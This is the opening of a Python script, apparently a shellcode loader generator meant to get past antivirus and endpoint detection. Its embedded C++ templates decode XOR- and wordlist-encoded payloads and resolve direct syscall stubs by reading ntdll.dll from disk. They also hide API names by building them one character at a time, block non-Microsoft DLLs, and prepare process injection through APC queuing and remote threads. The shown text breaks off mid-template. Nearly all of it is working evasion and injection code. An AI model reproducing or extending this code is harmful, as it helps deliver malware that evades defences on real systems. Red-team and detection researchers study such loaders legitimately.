#!/usr/bin/python3
#Created by Matthew David (@icyguider)
import sys, os, argparse, random, string, re, struct, pefile
import os.path
import urllib.request

inspiration = """
┳┻|
┻┳|
┳┻|
┻┳|
┳┻| _
┻┳| •.•)  - Shhhhh, AV might hear us! 
┳┻|⊂ﾉ   
┻┳|
"""

stub = """
#define _WIN32_WINNT 0x0600
#include <iostream>
#include <windows.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <tchar.h>
#include "skCrypter.h"
REPLACE_ME_SYSCALL_INCLUDE
#ifndef UNICODE  
typedef std::string String;
#else
typedef std::wstring String;
#endif

REPLACE_UNHOOKING_DEFINTIONS

REPLACE_THREADLESS_DEFINITIONS

REPLACE_ME_SHELLCODE_VARS

#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY 0x20007
#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON 0x100000000000

REPLACE_SAFEPRINT_FUNCTIONS

REPLACE_ME_SYSCALL_STUB_P1

REPLACE_SLEEP_CHECK

REPLACE_SANDBOX_CHECK

REPLACE_ME_NTDLL_UNHOOK

REPLACE_PROCESS_FUNCTIONS

REPLACE_THREADLESS_FUNCTIONS

REPLACE_DECODE_FUNCTION

int main()
{
    REPLACE_STUB_METHOD
}

REPLACE_DLL_MAIN
"""

regularShellcode = """
REPLACE_ME_PAYLOAD

SIZE_T payload_len = sizeof(payload);

unsigned char* decoded = (unsigned char*)malloc(payload_len);
"""

wordShellcode = """
REPLACE_ME_WORDLIST

REPLACE_ME_FILEWORDS

int wordsLength = sizeof(words)/sizeof(words[0]);
SIZE_T payload_len = sizeof(filewords)/sizeof(filewords[0]);

unsigned char* decoded = (unsigned char*)malloc(payload_len);
"""

regularDecode = """
int deC(unsigned char payload[])
{
    std::string key;
    key = skCrypt("REPLACE_ME_KEY");
    for (int i = 0; i < payload_len; i++)
    {
        decoded[i] = payload[i] ^ (int)key[i % key.length()];
    }
    key.clear();
    return 0;
}
"""

wordDecode = """
int deC()
{
    for (int i=0; i < payload_len; i++)
    {
        char* test = filewords[i];
        int i2 = 0;
        while (i2 < wordsLength)
        {
            if (words[i2] == test) {
                break;
            }
            i2++;
        }
        char ci = i2;
        decoded[i] = ci;
    }
    return 0;
}
"""

# This can be used to remove strings from memory. Currently breaks when used with ollvm
safePrint = """
int safe_print(auto msg)
{
    printf(msg);
    printf("\\n");
    msg.clear();
    return 0;
}

int safe_print(auto msg, NTSTATUS res)
{
    printf(msg);
    printf("0x%x\\n", res);
    msg.clear();
    return 0;
}
"""

GetSyscallStubP1 = """
typedef VOID(KNORMAL_ROUTINE) (
    IN PVOID NormalContext,
    IN PVOID SystemArgument1,
    IN PVOID SystemArgument2);

typedef KNORMAL_ROUTINE* PKNORMAL_ROUTINE;

typedef struct _PS_ATTRIBUTE
{
    ULONG  Attribute;
    SIZE_T Size;
    union
    {
        ULONG Value;
        PVOID ValuePtr;
    } u1;
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T       TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;

int const SYSCALL_STUB_SIZE = 23;
using myNtAllocateVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID BaseAddress, ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
using myNtWriteVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);
using myNtProtectVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
using myNtCreateThreadEx = NTSTATUS(NTAPI*)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PPS_ATTRIBUTE_LIST AttributeList);
using myNtResumeThread = NTSTATUS(NTAPI*)(HANDLE ThreadHandle, PULONG PreviousSuspendCount);
using myNtWaitForSingleObject = NTSTATUS(NTAPI*)(HANDLE ObjectHandle, BOOLEAN Alertable, PLARGE_INTEGER TimeOut);
using myNtQueryInformationProcess = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
using myNtReadVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesRead);
using myNtClose = NTSTATUS(NTAPI*)(HANDLE Handle);
using myNtOpenProcess = NTSTATUS(NTAPI*)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
using myNtQueueApcThread = NTSTATUS(NTAPI*)(HANDLE ThreadHandle, PKNORMAL_ROUTINE ApcRoutine, PVOID ApcArgument1, PVOID ApcArgument2, PVOID ApcArgument3);
using myNtAlertResumeThread = NTSTATUS(NTAPI*)(HANDLE ThreadHandle, PULONG PreviousSuspendCount);
using myNtGetContextThread = NTSTATUS(NTAPI*)(HANDLE ThreadHandle, PCONTEXT ThreadContext);
using myNtSetContextThread = NTSTATUS(NTAPI*)(HANDLE ThreadHandle, PCONTEXT Context);
using myNtDelayExecution = NTSTATUS(NTAPI*)(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval);
using myNtOpenSection = NTSTATUS(NTAPI*)(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
using myNtMapViewOfSection = NTSTATUS(NTAPI*)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect);

myNtAllocateVirtualMemory NtAllocateVirtualMemory;
myNtWriteVirtualMemory NtWriteVirtualMemory;
myNtProtectVirtualMemory NtProtectVirtualMemory;
myNtCreateThreadEx NtCreateThreadEx;
myNtResumeThread NtResumeThread;
myNtWaitForSingleObject NewNtWaitForSingleObject;
myNtQueryInformationProcess NewNtQueryInformationProcess;
myNtReadVirtualMemory NtReadVirtualMemory;
myNtClose NewNtClose;
myNtOpenProcess NtOpenProcess;
myNtQueueApcThread NtQueueApcThread;
myNtAlertResumeThread NtAlertResumeThread;
myNtGetContextThread NtGetContextThread;
myNtSetContextThread NtSetContextThread;
myNtDelayExecution NtDelayExecution;
myNtOpenSection NtOpenSection;
myNtMapViewOfSection NtMapViewOfSection;

PVOID RVAtoRawOffset(DWORD_PTR RVA, PIMAGE_SECTION_HEADER section)
{
        return (PVOID)(RVA - section->VirtualAddress + section->PointerToRawData);
}

BOOL GetSyscallStub(String functionName, PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection, LPVOID syscallStub)
{
        PDWORD addressOfNames = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfNames), rdataSection);
        PDWORD addressOfFunctions = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfFunctions), rdataSection);
        BOOL stubFound = FALSE;

        for (size_t i = 0; i < exportDirectory->NumberOfNames; i++)
        {
                DWORD_PTR functionNameVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfNames[i], rdataSection);
                DWORD_PTR functionVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfFunctions[i + 1], textSection);
                LPCSTR functionNameResolved = (LPCSTR)functionNameVA;
                if (strcmp(functionNameResolved, functionName.c_str()) == 0)
                {
                        memcpy(syscallStub, (LPVOID)functionVA, SYSCALL_STUB_SIZE);
                        stubFound = TRUE;
                }
        }

        return stubFound;
}
"""

GetSyscallStubP2 = """
    DWORD tProcess2 = GetCurrentProcessId();
    HANDLE pHandle2 = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2);

    HANDLE syscallStub_NtAllocateVirtualMemory = VirtualAllocEx(pHandle2, NULL, (SIZE_T)SYSCALL_STUB_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    HANDLE syscallStub_NtWriteVirtualMemory = static_cast<char*>(syscallStub_NtAllocateVirtualMemory) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtProtectVirtualMemory = static_cast<char*>(syscallStub_NtWriteVirtualMemory) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtCreateThreadEx = static_cast<char*>(syscallStub_NtProtectVirtualMemory) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtResumeThread = static_cast<char*>(syscallStub_NtCreateThreadEx) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtWaitForSingleObject = static_cast<char*>(syscallStub_NtResumeThread) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtQueryInformationProcess = static_cast<char*>(syscallStub_NtWaitForSingleObject) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtReadVirtualMemory = static_cast<char*>(syscallStub_NtQueryInformationProcess) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtClose = static_cast<char*>(syscallStub_NtReadVirtualMemory) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtOpenProcess = static_cast<char*>(syscallStub_NtClose) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtQueueApcThread = static_cast<char*>(syscallStub_NtOpenProcess) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtAlertResumeThread = static_cast<char*>(syscallStub_NtQueueApcThread) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtGetContextThread = static_cast<char*>(syscallStub_NtAlertResumeThread) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtSetContextThread = static_cast<char*>(syscallStub_NtGetContextThread) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtDelayExecution = static_cast<char*>(syscallStub_NtSetContextThread) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtOpenSection = static_cast<char*>(syscallStub_NtDelayExecution) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtMapViewOfSection = static_cast<char*>(syscallStub_NtOpenSection) + SYSCALL_STUB_SIZE;

    char syscallStub[SYSCALL_STUB_SIZE] = {};
    DWORD oldProtection = 0;
    HANDLE file = NULL;
    DWORD fileSize = NULL;
    DWORD bytesRead = NULL;
    LPVOID fileData = NULL;

    // define NtAllocateVirtualMemory
    NtAllocateVirtualMemory = (myNtAllocateVirtualMemory)syscallStub_NtAllocateVirtualMemory;
    VirtualProtect(syscallStub_NtAllocateVirtualMemory, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define myNtWriteVirtualMemory
    NtWriteVirtualMemory = (myNtWriteVirtualMemory)syscallStub_NtWriteVirtualMemory;
    VirtualProtect(syscallStub_NtWriteVirtualMemory, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define myNtProtectVirtualMemory
    NtProtectVirtualMemory = (myNtProtectVirtualMemory)syscallStub_NtProtectVirtualMemory;
    VirtualProtect(syscallStub_NtProtectVirtualMemory, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define myNtCreateThreadEx
    NtCreateThreadEx = (myNtCreateThreadEx)syscallStub_NtCreateThreadEx;
    VirtualProtect(syscallStub_NtCreateThreadEx, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define myNtResumeThread
    NtResumeThread = (myNtResumeThread)syscallStub_NtResumeThread;
    VirtualProtect(syscallStub_NtResumeThread, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define myNtWaitForSingleObject
    NewNtWaitForSingleObject = (myNtWaitForSingleObject)syscallStub_NtWaitForSingleObject;
    VirtualProtect(syscallStub_NtWaitForSingleObject, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define NtQueryInformationProcess
    NewNtQueryInformationProcess = (myNtQueryInformationProcess)syscallStub_NtQueryInformationProcess;
    VirtualProtect(syscallStub_NtQueryInformationProcess, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define NtReadVirtualMemory
    NtReadVirtualMemory = (myNtReadVirtualMemory)syscallStub_NtReadVirtualMemory;
    VirtualProtect(syscallStub_NtReadVirtualMemory, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define NtClose
    NewNtClose = (myNtClose)syscallStub_NtClose;
    VirtualProtect(syscallStub_NtClose, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define NtOpenProcess
    NtOpenProcess = (myNtOpenProcess)syscallStub_NtOpenProcess;
    VirtualProtect(syscallStub_NtOpenProcess, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define NtQueueApcThread
    NtQueueApcThread = (myNtQueueApcThread)syscallStub_NtQueueApcThread;
    VirtualProtect(syscallStub_NtQueueApcThread, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define NtAlertResumeThread
    NtAlertResumeThread = (myNtAlertResumeThread)syscallStub_NtAlertResumeThread;
    VirtualProtect(syscallStub_NtAlertResumeThread, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define NtGetContextThread
    NtGetContextThread = (myNtGetContextThread)syscallStub_NtGetContextThread;
    VirtualProtect(syscallStub_NtGetContextThread, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define NtSetContextThread
    NtSetContextThread = (myNtSetContextThread)syscallStub_NtSetContextThread;
    VirtualProtect(syscallStub_NtSetContextThread, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define syscallStub_NtDelayExecution
    NtDelayExecution = (myNtDelayExecution)syscallStub_NtDelayExecution;
    VirtualProtect(syscallStub_NtDelayExecution, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define NtOpenSection
    NtOpenSection = (myNtOpenSection)syscallStub_NtOpenSection;
    VirtualProtect(syscallStub_NtOpenSection, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define NtMapViewOfSection
    NtMapViewOfSection = (myNtMapViewOfSection)syscallStub_NtMapViewOfSection;
    VirtualProtect(syscallStub_NtMapViewOfSection, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);


    file = CreateFileA("c:\\\\windows\\\\system32\\\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    fileSize = GetFileSize(file, NULL);
    fileData = HeapAlloc(GetProcessHeap(), 0, fileSize);
    ReadFile(file, fileData, fileSize, &bytesRead, NULL);

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileData;
    PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileData + dosHeader->e_lfanew);
    DWORD exportDirRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(imageNTHeaders);
    PIMAGE_SECTION_HEADER textSection = section;
    PIMAGE_SECTION_HEADER rdataSection = section;

    for (int i = 0; i < imageNTHeaders->FileHeader.NumberOfSections; i++)
    {
            if (strcmp((CHAR*)section->Name, (CHAR*)".rdata") == 0) {
                    rdataSection = section;
                    break;
            }
            section++;
    }

    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)RVAtoRawOffset((DWORD_PTR)fileData + exportDirRVA, rdataSection);

    String scall = std::string("N") + "t" + "A" + "l" + "l" + "o" + "c" + "a" + "t" + "e" + "V" + "i" + "r" + "t" + "u" + "a" + "l" + "M" + "e" + "m" + "o" + "r" + "y";
    BOOL StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtAllocateVirtualMemory);
    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "W" + "r" + "i" + "t" + "e" + "V" + "i" + "r" + "t" + "u" + "a" + "l" + "M" + "e" + "m" + "o" + "r" + "y";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtWriteVirtualMemory);
    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "P" + "r" + "o" + "t" + "e" + "c" + "t" + "V" + "i" + "r" + "t" + "u" + "a" + "l" + "M" + "e" + "m" + "o" + "r" + "y";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtProtectVirtualMemory);
    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "C" + "r" + "e" + "a" + "t" + "e" + "T" + "h" + "r" + "e" + "a" + "d" + "E" + "x";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtCreateThreadEx);
    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "R" + "e" + "s" + "u" + "m" + "e" + "T" + "h" + "r" + "e" + "a" + "d";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtResumeThread);
    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "W" + "a" + "i" + "t" + "F" + "o" + "r" + "S" + "i" + "n" + "g" + "l" + "e" + "O" + "b" + "j" + "e" + "c" + "t";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtWaitForSingleObject);
    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "Q" + "u" + "e" + "r" + "y" + "I" + "n" + "f" + "o" + "r" + "m" + "a" + "t" + "i" + "o" + "n" + "P" + "r" + "o" + "c" + "e" + "s" + "s";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtQueryInformationProcess);
    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "R" + "e" + "a" + "d" + "V" + "i" + "r" + "t" + "u" + "a" + "l" + "M" + "e" + "m" + "o" + "r" + "y";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtReadVirtualMemory);
    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "C" + "l" + "o" + "s" + "e";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtClose);
    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "O" + "p" + "e" + "n" + "P" + "r" + "o" + "c" + "e" + "s" + "s";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtOpenProcess);
    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "Q" + "u" + "e" + "u" + "e" + "A" + "p" + "c" + "T" + "h" + "r" + "e" + "a" + "d";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtQueueApcThread);
    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "A" + "l" + "e" + "r" + "t" + "R" + "e" + "s" + "u" + "m" + "e" + "T" + "h" + "r" + "e" + "a" + "d";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtAlertResumeThread);
    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "G" + "e" + "t" + "C" + "o" + "n" + "t" + "e" + "x" + "t" + "T" + "h" + "r" + "e" + "a" + "d";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtGetContextThread);
    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "S" + "e" + "t" + "C" + "o" + "n" + "t" + "e" + "x" + "t" + "T" + "h" + "r" + "e" + "a" + "d";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtSetContextThread);
    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "D" + "e" + "l" + "a" + "y" + "E" + "x" + "e" + "c" + "u" + "t" + "i" + "o" + "n";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtDelayExecution);
    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "O" + "p" + "e" + "n" + "S" + "e" + "c" + "t" + "i" + "o" + "n";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtOpenSection);
    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "M" + "a" + "p" + "V" + "i" + "e" + "w" + "O" + "f" + "S" + "e" + "c" + "t" + "i" + "o" + "n";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtMapViewOfSection);
    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
"""

NoSyscall_StubP1 = """
typedef VOID(KNORMAL_ROUTINE) (
    IN PVOID NormalContext,
    IN PVOID SystemArgument1,
    IN PVOID SystemArgument2);

typedef KNORMAL_ROUTINE* PKNORMAL_ROUTINE;

typedef struct _PS_ATTRIBUTE
{
    ULONG  Attribute;
    SIZE_T Size;
    union
    {
        ULONG Value;
        PVOID ValuePtr;
    } u1;
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T       TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;

using myNtAllocateVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID BaseAddress, ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
using myNtWriteVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);
using myNtProtectVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
using myNtCreateThreadEx = NTSTATUS(NTAPI*)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PPS_ATTRIBUTE_LIST AttributeList);
using myNtResumeThread = NTSTATUS(NTAPI*)(HANDLE ThreadHandle, PULONG PreviousSuspendCount);
using myNtWaitForSingleObject = NTSTATUS(NTAPI*)(HANDLE ObjectHandle, BOOLEAN Alertable, PLARGE_INTEGER TimeOut);
using myNtQueryInformationProcess = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
using myNtReadVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesRead);
using myNtClose = NTSTATUS(NTAPI*)(HANDLE Handle);
using myNtOpenProcess = NTSTATUS(NTAPI*)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
using myNtQueueApcThread = NTSTATUS(NTAPI*)(HANDLE ThreadHandle, PKNORMAL_ROUTINE ApcRoutine, PVOID ApcArgument1, PVOID ApcArgument2, PVOID ApcArgument3);
using myNtAlertResumeThread = NTSTATUS(NTAPI*)(HANDLE ThreadHandle, PULONG PreviousSuspendCount);
using myNtGetContextThread = NTSTATUS(NTAPI*)(HANDLE ThreadHandle, PCONTEXT ThreadContext);
using myNtSetContextThread = NTSTATUS(NTAPI*)(HANDLE ThreadHandle, PCONTEXT Context);
using myNtDelayExecution = NTSTATUS(NTAPI*)(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval);
using myNtOpenSection = NTSTATUS(NTAPI*)(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
using myNtMapViewOfSection = NTSTATUS(NTAPI*)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect);

// Get API functions required to unhook.
char Nt[] = { 'n','t','d','l','l','.','d','l','l', 0 };
char NtMapVOS[] = { 'N','t','M','a','p','V','i','e','w','O','f','S','e','c','t','i','o','n', 0 };
char NtOpenSec[] = { 'N','t','O','p','e','n','S','e','c','t','i','o','n', 0 };
myNtMapViewOfSection NtMapViewOfSection = (myNtMapViewOfSection)(GetProcAddress(GetModuleHandleA(Nt), NtMapVOS));
myNtOpenSection NtOpenSection = (myNtOpenSection)(GetProcAddress(GetModuleHandleA(Nt), NtOpenSec));

// Init vars for other API functions, will define after we have a chance to unhook ntdll 
myNtAllocateVirtualMemory NtAllocateVirtualMemory;
myNtWriteVirtualMemory NtWriteVirtualMemory;
myNtProtectVirtualMemory NtProtectVirtualMemory;
myNtCreateThreadEx NtCreateThreadEx;
myNtResumeThread NtResumeThread;
myNtWaitForSingleObject NewNtWaitForSingleObject;
myNtQueryInformationProcess NewNtQueryInformationProcess;
myNtReadVirtualMemory NtReadVirtualMemory;
myNtClose NewNtClose;
myNtOpenProcess NtOpenProcess;
myNtQueueApcThread NtQueueApcThread;
myNtAlertResumeThread NtAlertResumeThread;
myNtGetContextThread NtGetContextThread;
myNtSetContextThread NtSetContextThread;
myNtDelayExecution NtDelayExecution;
"""

NoSyscall_StubP2 = """
    // Get API functions. These will have hooks in them unless unhooking is perfomed first.
    String scall = std::string("N") + "t" + "A" + "l" + "l" + "o" + "c" + "a" + "t" + "e" + "V" + "i" + "r" + "t" + "u" + "a" + "l" + "M" + "e" + "m" + "o" + "r" + "y";
    NtAllocateVirtualMemory = (myNtAllocateVirtualMemory)(GetProcAddress(GetModuleHandleA(Nt), scall.c_str()));
    scall = std::string("N") + "t" + "W" + "r" + "i" + "t" + "e" + "V" + "i" + "r" + "t" + "u" + "a" + "l" + "M" + "e" + "m" + "o" + "r" + "y";
    NtWriteVirtualMemory = (myNtWriteVirtualMemory)(GetProcAddress(GetModuleHandleA(Nt), scall.c_str()));
    scall = std::string("N") + "t" + "P" + "r" + "o" + "t" + "e" + "c" + "t" + "V" + "i" + "r" + "t" + "u" + "a" + "l" + "M" + "e" + "m" + "o" + "r" + "y";
    NtProtectVirtualMemory = (myNtProtectVirtualMemory)(GetProcAddress(GetModuleHandleA(Nt), scall.c_str()));
    scall = std::string("N") + "t" + "C" + "r" + "e" + "a" + "t" + "e" + "T" + "h" + "r" + "e" + "a" + "d" + "E" + "x";
    NtCreateThreadEx = (myNtCreateThreadEx)(GetProcAddress(GetModuleHandleA(Nt), scall.c_str()));
    scall = std::string("N") + "t" + "R" + "e" + "s" + "u" + "m" + "e" + "T" + "h" + "r" + "e" + "a" + "d";
    NtResumeThread = (myNtResumeThread)(GetProcAddress(GetModuleHandleA(Nt), scall.c_str()));
    scall = std::string("N") + "t" + "W" + "a" + "i" + "t" + "F" + "o" + "r" + "S" + "i" + "n" + "g" + "l" + "e" + "O" + "b" + "j" + "e" + "c" + "t";
    NewNtWaitForSingleObject = (myNtWaitForSingleObject)(GetProcAddress(GetModuleHandleA(Nt), scall.c_str()));
    scall = std::string("N") + "t" + "Q" + "u" + "e" + "r" + "y" + "I" + "n" + "f" + "o" + "r" + "m" + "a" + "t" + "i" + "o" + "n" + "P" + "r" + "o" + "c" + "e" + "s" + "s";
    NewNtQueryInformationProcess = (myNtQueryInformationProcess)(GetProcAddress(GetModuleHandleA(Nt), scall.c_str()));
    scall = std::string("N") + "t" + "R" + "e" + "a" + "d" + "V" + "i" + "r" + "t" + "u" + "a" + "l" + "M" + "e" + "m" + "o" + "r" + "y";
    NtReadVirtualMemory = (myNtReadVirtualMemory)(GetProcAddress(GetModuleHandleA(Nt), scall.c_str()));
    scall = std::string("N") + "t" + "C" + "l" + "o" + "s" + "e";
